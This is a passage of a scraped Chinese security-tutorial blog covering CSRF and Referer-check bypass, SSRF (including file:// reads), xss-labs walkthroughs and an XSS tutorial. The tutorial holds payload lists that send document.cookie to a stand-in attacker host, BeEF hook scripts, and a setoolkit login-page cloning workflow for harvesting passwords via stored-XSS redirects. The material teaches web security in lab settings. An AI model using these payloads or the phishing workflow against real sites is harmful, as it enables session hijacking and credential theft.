generateToken()&#123;&#x2F;&#x2F; 获取简单的日期（年、月、日） $salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);&#x2F;&#x2F; 进行md5加密 $token&#x3D;md5($salt);&#x2F;&#x2F; 返回值 return $token;&#125; 4、使用Token进行CSRF漏洞防御1、登录验证成功之后，在会话SESSION[“user_token”]中保存Token。 2、在后台操作中，增删改查表单中添加隐藏域hidden，设置value为Token 3、提交之后进行验证Token是否正确。 代码分析 123456789101112131415161718192021222324&lt;?php session_start(); function token_generate()&#123; $salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;); $token&#x3D;md5($salt); return $token; &#125; $token&#x3D;token_generate(); $_SESSION[&quot;USER_TOKEN&quot;]&#x3D;$token;?&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;CSRF_Token&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;CSRF_Token&lt;&#x2F;h1&gt; &lt;form action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;我提交了&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;user_token&quot; value&#x3D;&quot;&lt;?php echo $token;?&gt;&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 查看页面 F12查看Ntwork 点击提交返回successful 复制URL和源码进行POC修改 在源码中修改地址，这里的Token和原始的Token是不一样的 CSRF绕过Referer技巧1、Referer防御CSRF原理HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。 当用户点击被构造好的CSRF利用页面，那么执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务器判断Referer值是否与服务器的域名信息有关。如果不相关则不执行操作 2、Referer防御代码编写在PHP中使用$_SERVER[‘HTTP_REFERER’]获取页面提交请求中的Referer值 1234567891011&lt;?php&#x2F;&#x2F; 获取REFERER，用其与相关的字符串比较。例如当前域名xx.com,使用strpos进行包含验证，如果提交的REFERER包含了xx.com那么判断成功。返回True，如果为false，它请求的上一个页面不是xx.com当中的页面，这个时候判断失败。 if(strpos($_SERVER[&#39;HTTP_REFERER&#39;],&#39;XX.com&#39;)!&#x3D;&#x3D;false) &#123; 判断成功 &#125; else &#123; 判断失败 &#125;?&gt; 3、绕过Referer技巧技巧：如果服务端只判断当前的Referer中是否具有域名，那么直接可以新建文件夹进行绕过。 测试页面 查看源码 在站点目录下新建一个ip的文件夹，将CSRF放在这个文件夹中 放进去后需要编辑index内容，这个链接连接到了一个CSRF的绕过，这个链接只判断了referer，这样我们就可以进行绕过 打开这个ip的页面，有1这个超链接进行打开，可以看到burpsuite中抓取到的referer值包含对应的IP地址。 请求的页面是csrf_test/referer_test.php，如果不包含对应的ip就不能进行对应的操作。将内容放过 页面返回successful，成功触发了对应的操作 4、Burpsuite自动生成POCBurpsuite只有在专业版才能生成POC，社区版不能生成POC 将当前页面提交，然后截断 截断之后在burpsuite右键选择Engaenment tools中的最后一个G开头的，这样就会输出POC代码，复制在一个新文件当中保存进去就行，或者直接使用对应提示进行保存 GET型CSRF漏洞利用方法1、链接利用在HTML中，a标签代表链接，可以将当前的“页面位置”指引到其他位置。实现跳转的过程 移动的“页面位置”需要发送对应的请求到链接所指向的地址，然后返回响应。 &lt;a href=&quot;请求地址，会被http请求到的未知，可以携带GET型参数&quot;&gt;内容&lt;/a&gt; &lt;a href=&quot;http://127.0.0.1/csrf_test/get_csrf/new_user.php?username=Mars&amp;password=123456&quot;&gt;请点击我&lt;/a&gt; 2、iframe利用iframe标签内容将在页面加载 过程中自动进行加载，src指向的位置就是页面请求的位置 注意：可以设置iframe的style -&gt; display:none，以此来不显示iframe加载的内容 3、img标签利用img标签的内容会随着页面加载而被请求，以此src只想的位置会在页面加载过程中进行请求。 4、CSS-backgroud利用 CSRF漏洞防御1、验证码防御验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。 CSRF在用户不知情的情况下弯沉个对应操作，而验证码强制用户与应用程序交互，才能最终完成操作，通常情况下，验证码能够很好地遏制CSRF。 出于用户体验考虑，不可能每一个操作都加入验证码。所以验证码只作为辅助手段，不作为防御CSRF的主要解决方案。 验证码防御也可以被认为是二次验证。 2、Referer Check防御Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源” 缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。 3、Anti CSRF Token防御CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的 防御措施就是生成一个随机且不被轻易猜测的参数。目前大多是防御都是采用token(不可预测) 4、Token泄露 SSRF漏洞SSRF介绍SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统（正因为请求是由服务端发起的，所以服务端能请求到自身相连而与外网隔离的内部系统）。 SSRF原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等，利用的是服务端的请求伪造。SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器 主要攻击方法 对外网、服务器所在内网、本地进行端口扫描、获取一些服务的banner信息。 攻击运行在内网或本地的应用程序上。 对内网的Web应用进行指纹识别，识别企业内部的资产信息。 攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击（比如：struts2、SQli等）。 利用file协议读取本地文件等。 SSRF漏洞利用SSRF漏洞利用的测试地址：http://127.0.0.1/ssrf.php?url=http://127.0.0.1/2.php 页面ssrf.php实现的功能是获取GET参数URL，然后将URL的内容返回网页上。如果将请求的网址篡改为http://www,baidu.com，则会显示http://www.baidu.com的页面内容 但是，当设置参数URL为内网地址是，则会泄露内网信息，例如，当URL=192.168.0.2:3306时页面返回“当前地址不允许连接到Mysql服务器”，说明192.168.0.2存在Mysql服务 访问ssrf.php?url=file:///c:/Windows/win.ini即可读取本地文件。 SSRF漏洞代码分析​ 在页面SSRF.php中，程序获取GET参数URL，通过curl_init()初始化curl组件后，将参数URL带入curl_setopt（$ch,CURLOPT_URL，$url），然后调用所以curl-exec请求该URL。由于服务端会将banner信息返回客户端，所以可以根据banner判断主机是否存在某些服务。 SSRF漏洞修复建议针对SSRF漏洞修复，有以下几点 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS请求。 限制不能访问内网的IP，以防止对内网进行攻击。 屏蔽返回的详细信息。","categories":[],"tags":[]},{"title":"xss-labs","slug":"xss-labs","date":"2020-04-22T12:48:52.281Z","updated":"2020-04-18T07:25:46.000Z","comments":true,"path":"2020/04/22/xss-labs/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/22/xss-labs/","excerpt":"","text":"xss-labs第一关源码 分析 分析： 后台源码将用户以GET方式提交的参数name，原封不动地显示在HTML页面中，所以将弹框语句放入name变量中即可： 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;&lt;script&gt;window.alert &#x3D; function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href&#x3D;&quot;level2.php?keyword&#x3D;test&quot;; &#125;&lt;&#x2F;script&gt;&lt;title&gt;欢迎来到level1&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level1&lt;&#x2F;h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str &#x3D; $_GET[&quot;name&quot;];echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;?&gt;&lt;center&gt;&lt;img src&#x3D;level1.png&gt;&lt;&#x2F;center&gt;&lt;?php echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 构造一个内容，这里输入111，F12查看 这里没有进行任何过滤和防护，而且是直接在h2标签中，这样直接使用使用script标签构造XSS payload：&lt;script&gt;alert(1)&lt;/script&gt; xss-labs第二关源码 分析： htmlspecialchars： 作用：把预定义的字符转换为 HTML 实体，而不是作为标签运行；如果不用HTMLSpecialChars，就会导致读取时，把” \"之类的HTML标签带有功能地输出。 HTML实体格式： 123&amp;entity_name;或者&amp;#entity_number; 转化规则： 如下例，在使用了htmlspecialchars后，将输出字符串\"\"；当不使用时，则会弹框。 1234&lt;?php$str&#x3D;&quot;&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;&quot;;echo htmlspecialchars($str); ?&gt; 本例中，在返回的HTML页面的第一处使用了htmlspecialchars，而第二处没有使用，且两处都没有过滤机制。所以我们在第二处闭合&lt;input&gt;标签，直接弹框： payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;&lt;script&gt;window.alert &#x3D; function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href&#x3D;&quot;level3.php?writing&#x3D;wait&quot;; &#125;&lt;&#x2F;script&gt;&lt;title&gt;欢迎来到level2&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level2&lt;&#x2F;h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str &#x3D; $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action&#x3D;level2.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src&#x3D;level2.png&gt;&lt;&#x2F;center&gt;&lt;?php echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 构造内容，F12查看，如果找不到ctrl+F进行搜索。 这里在input标签中，进行了双引号包裹。所以需要进行闭合标签 闭合标签因为是双引号闭合格式\"> 复制payload提交 xss-labs第三关源码 分析 一共有两处转义： 第一处转义，输入被转义为html实体，不能直接执行； 第二处转义，输入被转义为html实体，不能直接执行，也不能闭合双引号。但是单引号没被转义。 所以可以用单引号闭合input标签，使用不包含被转义特殊字符的弹框方式。 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;&lt;script&gt;window.alert &#x3D; function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href&#x3D;&quot;level4.php?keyword&#x3D;try harder!&quot;; &#125;&lt;&#x2F;script&gt;&lt;title&gt;欢迎来到level3&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level3&lt;&#x2F;h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str &#x3D; $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action&#x3D;level3.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src&#x3D;level3.png&gt;&lt;&#x2F;center&gt;&lt;?php echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 构造内容查看响应 发现和第二关一样，闭合提交 发现，尖括号被转义了 所以就不能使用尖括号进行xss了，这里可以使用事件或者伪协议等 事件payload：&#39;onclick=&#39;alert(1) 因为这里使用的是onclick所以提交之后需要单击一下输入框才能弹出弹框 如果不想单击使用onmouseover进行提交，提交之后鼠标放到输入框就会弹出 伪协议payload：'onclick='javascript:alert(1) 进行提交，弹出弹框。 xss-labs第四关源码 分析 将用户输入个keyword中的替换为空，但在input标签内并未转义。所以直接闭合input标签中的value（不能闭合整个input标签）并使用不带尖括号但弹框方式即可。 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;&lt;script&gt;window.alert &#x3D; function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href&#x3D;&quot;level5.php?keyword&#x3D;find a way out!&quot;; &#125;&lt;&#x2F;script&gt;&lt;title&gt;欢迎来到level4&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level4&lt;&#x2F;h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str &#x3D; $_GET[&quot;keyword&quot;];$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action&#x3D;level4.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src&#x3D;level4.png&gt;&lt;&#x2F;center&gt;&lt;?php echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;&#x2F;h3&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 构造内容，响应中查找 进行闭合，尝试，尖括号过滤了 使用事件来进行xss尝试 使用单引号闭合的时候发现颜色不一样 在使用双引号 payload：&quot;onclick=&quot;alert(1) 成功闭合，伪协议用法相同 xss-labs第五关源码 分析 对","categories":[],"tags":[]},{"title":"XSS","slug":"XSS","date":"2020-04-20T01:00:48.651Z","updated":"2020-04-20T00:59:46.000Z","comments":true,"path":"2020/04/20/XSS/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/20/XSS/","excerpt":"","text":"XSS介绍跨站脚本(Cross-Site Scripting跨域脚本攻击，简称为XSS)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。他允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限(如执行一些操作)、私密网页内容、会话和cookie等各种内容 XSS原因：过于信任客户端提交的数据 XSS攻击可分为三种：反射性，存储型，DOM型 XSS漏洞原理1、反射性XSS​ 反射性XSS又称为非持久性XSS，这种攻击方式往往只具有一次性 ​ 攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问连接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会出发XSS漏洞 例如： 123&lt;?php echo $_GET[&quot;uname&quot;];?&gt; 当用户访问url?uname=&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;触发代码弹出对话框 随便输入内容，会返回输入的内容 使用&lt;script&gt;alert(document.cookie);&lt;/script&gt;查看页面返回，成功返回cookie值 2、存储型XSS​ 存储型XSS又称为持久性XSS，攻击脚本将被永远地存放在目标服务器的数据库或文件中，具有很高的隐秘性 ​ 攻击方式：这种攻击多见于论坛、博客、和留言版，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子中，随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入的恶意脚本帖子时，恶意脚本会在他们的浏览器中得到执行。 ​ 例如，恶意攻击这在留言板中加入以下代码。 1&lt;script&gt;alert(&#x2F;hacker by hacker&#x2F;)&lt;&#x2F;script&gt;) 当其他用户访问留言板时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入到一个页面中，所有访问这个页面的用户都将成为受害者。 在name处输入hello，或者其他任何都行，在Message输入XSS代码 点击Sign Guestbook，返回cookie值 刷新页面或者切换别的模式在回来点还是弹出cookie信息 3、DOM型XSS​ DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。​ DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 ​ HTML的标签都是节点，而这些节点组成了DOM的整体结构—节点树。通过HTML DOM，树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点，HTML DOM树结构 查看DMO XSS 选择一个类型进行上传 发现URL改变了 在括号处更改值，例如改为123，然后回车，发现下拉选项框中出现了123 构造XSS脚本常用HTML标签1234567&lt;iframe&gt; ifranme 元素会创建包含另一个文档的内联框架(即行内框架)&lt;textarea&gt; &lt;textarea&gt;标签定义多行的文本输入控件&lt;img&gt; img元素像网页中嵌入一幅图像&lt;script&gt; &lt;script&gt; 标签用于定义客户端脚本，如果JavaScript。 script 元素既可以包含脚本语句，也可以通过src 属性指向外部脚本文件 必须的 type 属性规定脚本的MIME类型。 JavaScript 的常见应用时图片操作、表单验证以及动态内容更新 常用的JavaScript方法123456alert alert()方法用于显示带有一条指定信息和一个按钮的警告框window.loaction window.loaction对象用于获得当前页面的地址(URL),并把浏览器重定向到新的页面location.href 返回当前显示的文档的完整 URLonload 一张页面或一幅图像完成加载onsubmit 确认按钮被点击onerror 在加载文档或图片时发生错误 构造XSS脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344弹窗警告此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入漏洞测试中的&#39;单引号，一旦此脚本能执行，也就意味着后端服务器没有对特殊符号进行过滤&lt;&gt;&#x2F;&#39;这样就可以证明，这个页面位置存在了XSS漏洞。&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;页面嵌套&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;300 height&#x3D;300&gt;&lt;&#x2F;iframe&gt;&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;0 height&#x3D;0&gt;&lt;&#x2F;iframe&gt;页面重定向&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;弹框警告并重定向&lt;script&gt;alert(&quot;请移步到我们的新站&quot;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;&lt;script&gt;alert(&#39;xss&#39;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.127.0.0.1&#x2F;upload&#x2F;5.txt&quot;&lt;&#x2F;script&gt;这里结合了一些社工的思路，例如：通过网站内部私信的方式将其发送给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户，(克隆网站收集账户)访问恶意代码&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;当别人看到script是脚本，脚本想想就是不好的，这样就可以巧妙运用图片标签了巧用图片标签&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;laert(&#39;xss&#39;)&gt;&lt;img src&#x3D;&quot;javascript:Falert(&#39;xss&#39;);&quot;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;img&gt;绕开过滤的脚本大小写 &lt;ScrIpT&gt;alert(&#39;xss&#39;)&gt;&lt;&#x2F;ScrIpT&gt;字符编码采用URL、Base64等编码收集用户cookie打开新窗口并采用本地cookie访问目标网页。&lt;script&gt;window.open(&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;&lt;script&gt;document.location&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.phpcookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;img&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;iframe&gt; 自动化XSSBeEF介绍BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单 http://beefprohect.com/ 123456789101112131415161718192021222324信息搜集：1、网络发现2、主机信息3、Cookie获取4、会话劫持5、键盘记录6、插件信息持久化控制：1、确认弹窗2、小窗口3、中间人社会工程：1、点击劫持2、弹窗警告3、虚假页面4、钓鱼网站渗透攻击：1、内网渗透2、Metasploit3、CSRF攻击4、DDOS攻击 BeEF基础12启动Apache和BeEFservic apache2 start 启动beef给了你地址和脚本 可以不在kali中访问，直接复制地址在本机上访问，如果在本机访问不能使用127.0.0.1，需要改为kali的ip，进行访问，账号是beef密码是你自己当时开启beef时设置的 在线浏览和离线浏览没有用户访问 当其他机器访问，我们这个也面时，就会执行XSS存储型漏洞 查看beef页面，这两台主机访问了我们的页面，成功将其ip抓取 查看beef的Current Browser模块下的Details子模块，Details子模块下的内容是浏览器的详细信息，里面包含了你当前浏览器的所有信息 查看Commands组件，里面是可能存在的攻击点 可以攻击一下查看是否能成功 上面是已经攻击完的，点击第三步，查看是否有cook值，页面返回cookie值说明页面攻击成功 命令颜色1234绿色 对目标主机生效并且不可见(不会被发现)橙色 对目标主机生效但可能可见(可能被发现)灰色 对目标主机未必生效(可验证下)红色 对目标主机不生效 XSS盗取用户信息1、盗取用户信息原理克隆网站登录页面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。 用户正常访问存在XSS漏洞的原始站点，原始站点存在XSS漏洞，被利用之后进行跳转，跳转到被利用的克隆站点，克隆站点和原始站点类似，但是只克隆了他的登录界面，这个时候用户会访问到克隆站点的登录界面，这个时候可能由于安全意识的薄弱，会输入用户的账号密码，这样克隆站点就成功地读取了用户的用户名和密码 2、setookit工具克隆网站这是本地dvwa的登录界面 使用setookit来克隆一个登陆界面，在kali命令行中输入setookit 输入1选择Social-Engineering Attacks 输入2选择Website Attack Vectors 输入3选择Credential Harvester Attack Method 输入2选择Site Cloner，这个时候就会弹出kali的ip，不用输入内容直接回车 在这个位置输入本地的登录界面地址 将红线位置地址输入到kali 上 输入完回车，这就是已经复制成功了 访问kali的ip地址查看是否有登录界面，成功克隆完成 3、存储型xss跳转克隆网站xss payload：&lt;script&gt;window.location=&quot;跳转的URL&quot;&lt;/script&gt; 4、查看盗取账号和密码输入xss payload，上传，这里的ip地址改为kali的ip也就是跳转的ip 发现页面成功跳转，输入用户名和密码登录，登录的时候观察上方ip的变化 登录后，在kali中查看信息，发现成功获取了用户名和密码 没有过滤的XSS1、实验环境介绍http://xss-quiz.int21h.jp/ 一个日本安全研究员制作的XSS练习靶场 2、html中文本标签b介绍&lt;b&gt;标签规定粗体文本。 &lt;p&gt;标签是段落，在段落中加入&lt;b&gt;标签，这是粗体文本的话加粗，普通文本不加粗 3、探测XSS过程1、构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面。 说白了就是随便输，爱输啥输啥 例如：156165161das651d65asd51 按F12使用箭头选中输入的文字 4、闭合文本标签利用XSS这是一个最简单Payload，这里可以直接输出domain。 因为&lt;b&gt;标签中加入&lt;script&gt;这个标签可以直接识别为JavaScript，那么就会弹出domain 1、简单的Payload：&lt;script&gt;alert(document.domain);&lt;/script&gt; 提交 点击确定，返回Congratulations!! 比较复杂的Payload，闭合方式的Payload。 首先闭合双引号然后闭合&lt;b&gt;标签，后面是&lt;script&gt;代码，前面会闭合后面会当做普通文本输出 HTML中的标签比如说&lt;b&gt;标签它以它开始之后是对应的文本，结束是&lt;/b&gt;，如果只有&lt;/b&gt;的话，它会当做简单的字符串处理，而不会当作一个标签处理。 2、闭合标签Payload：&quot;&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 提交，点击确定 返回Congratulations!! 标签属性中的XSS1、配置Chrome关闭XSS-Auditorhttp://xss-quiz.int21h.jp/利用XSS过程中会出现下图情况。配置Chrome –args –disable-xss-auditor 右键谷歌浏览器复制地址，在桌面新建快捷方式，将地址复制进去，在将–args –disable-xss-auditor复制进去，就可以 这个配置只有在chrome提交xss信息报错XSS错误的时候用。如果没有报错就不需要配置了 2、属性中得到XSS发现技巧：ctrl+F 搜索特定的字符串 页面并没有显示我们输入的内容 按F12查看元素，可以直接使用箭头，然后选择输入框，也可以使用ctrl+f进行搜索 箭头这两处都可以。 3、属性中的XSS闭合引入script闭合引号尖括号，引入script 当然也可以在双引号前面加上值 &quot;&gt;&lt;script&gt;alert(document.domuin);&lt;/script&gt;将这段代码复制到输入框提交 提交，返回弹框点击确定 返回Congratulations!! 4、属性中的XSS闭合引入事件onmouseover意思就是当鼠标移动到输入框时弹出后面的内容 Payload：&quot;onmouseover=alert(document.domain);&gt; 提交之后将鼠标放到输入框上，就会弹出内容，将鼠标放到篮框中就会弹出内容 返回Congratulations!! 选择列表中的XSS1、HTML select标签介绍select元素可以创建单选或多选菜单。 &lt;select&gt; 元素中的 &lt;option&gt;标签用于定义列表中的可用选项 2、表单介绍HTML表单用于搜集不同类型的用户输入 可以使用浏览器查看提交的数据 3、Burpsuite测试XSS使用burpsuite截取HTTP请求，修改提交参数 可以在蓝线处进行修改写入XSS 4、闭合触发XSS这里不管是闭合还是不闭合都可以弹出xss，都可以通关 蓝线处可以加&lt;/option&gt;来闭合前面的列表也可以不用闭合 点击go查看页面显示。 页面并没有返回Congratulations!! 通关信息 再点回Raw，复制链接 点击Show response borwser，复制copy连接 复制完连接去浏览器打开，成功出现弹框 确定返回Congratulations!! 隐藏参数中的XSS1、HTML表单隐藏参数介绍隐藏域就是用来收集或者发送消息的不可见元素，对于网页的访问者来说，隐藏于是看不见的。表单被提交时，隐藏域就会将信息用你设置时定义的名称和值发送到服务器上。 代码格式：&lt;input type=&quot;hidden&quot; name=&quot;...&quot; value=&quot;...&quot;&gt; 2、Burpsutie抓包测试使用burpsutie进行抓包，截取提交的HTTP请求。 使用浏览器审计和burp对照 3、HTML中svg介绍SVG意为可缩放矢量图形（Scalable Vector Graphics） SVG使用XML格式定义图像。 SVG文件可通过以下标签嵌入HTML文档：&lt;embed&gt;、&lt;object&gt;或者&lt;iframe&gt;。也可以使用svg标签插入 这里可以是斜杠也可以是空格 &lt;svf/事件=&quot;&quot;&gt; 4、闭合触发XSS&quot;&gt;闭合属性，使用&lt;svg onload=alert(document.domain);&gt;弹出对应的内容，使用%0a替换空格，来讲标签之间有一个间隙 Payload：&quot;&gt;&lt;svg onload=alert(document.domain);&gt;%0a 经过测试，在p1，p2后面输入xss代码，xss代码都会被网页直接输出，只有在p3的时候xss代码才没有回显到网页上。查看源代码发现，value显示了我们之前提交的内容，script脚本被加载到type=&quot;hidden&quot;和value=&quot;hackme&quot;当中，这时候我们可以使用闭合方式或者其他方式进行对应的测试。 我们使用闭合查看是否能被输出 